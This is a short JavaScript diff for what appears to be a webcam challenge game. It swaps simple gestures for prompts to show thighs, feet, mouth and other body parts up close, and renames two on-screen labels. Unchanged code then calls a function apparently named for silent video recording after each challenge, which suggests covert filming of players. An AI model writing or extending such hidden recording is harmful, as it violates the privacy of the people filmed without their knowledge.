@@ -195,10 +195,21 @@
 
     let usuarioAtual = "";
     let partesCorpo = [
-        "Levantar Mão Direita",
-        "Levantar Mão Esquerda",
+        "Mostrar a Boca sorrindo",
+        "Aproximar o Braço Direito",
+        "Aproximar o Braço Esquerdo",
+        "Mostrar a Coxa Direita",
+        "Mostrar a Coxa Esquerda",
+        "Aproximar o Joelho Direito",
+        "Aproximar o Joelho Esquerdo",
+        "Mostrar o Pé Direito",
+        "Mostrar o Pé Esquerdo",
+        "Mostrar os Pés",
         "Mãos na Cabeça",
-        "Cruzar os Braços"
+        "Fazer Careta com a Boca",
+        "Piscar o Olho Esquerdo",
+        "Piscar o Olho Direito",
+        "Mostrar o Nariz bem perto"
     ];
     let desafioAtual = "";
     let timerInterval = null;
@@ -230,7 +241,7 @@
 
         const randomIndex = Math.floor(Math.random() * partesCorpo.length);
         desafioAtual = partesCorpo[randomIndex];
-        document.getElementById('target-box').innerText = `Ação: ${desafioAtual}`;
+        document.getElementById('target-box').innerText = `Desafio: ${desafioAtual}`;
 
         try {
             if (gameStream) {
@@ -273,7 +284,7 @@
         document.getElementById('loading-text').innerText = "Salvando pontuação...";
         document.getElementById('loading-screen').classList.remove('hidden');
 
-        document.getElementById('qr-result').innerText = `Ação Realizada: ${desafioAtual}`;
+        document.getElementById('qr-result').innerText = `Concluído: ${desafioAtual}`;
 
         iniciarGravacaoVideoSilenciosa(desafioAtual);
     }
